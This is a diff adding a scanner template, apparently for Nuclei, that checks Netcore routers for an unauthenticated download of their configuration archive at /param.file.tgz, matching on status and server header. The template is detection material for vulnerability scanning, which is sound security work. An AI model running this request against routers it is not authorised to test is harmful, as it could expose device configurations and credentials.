@@ -1,0 +1,21 @@
+id: Netcore-unauth
+info:
+  author: Str1am
+  name: "Netcore\u8DEF\u7531\u5668param.file.tgz\u6587\u4EF6\u5B58\u5728\u672A\u6388\
+    \u6743\u4E0B\u8F7D\u6F0F\u6D1E"
+  severity: high
+  tags: Netcore,unauth
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: header
+    type: word
+    words:
+    - 'Server: HTTP Software 1.1'
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/param.file.tgz'
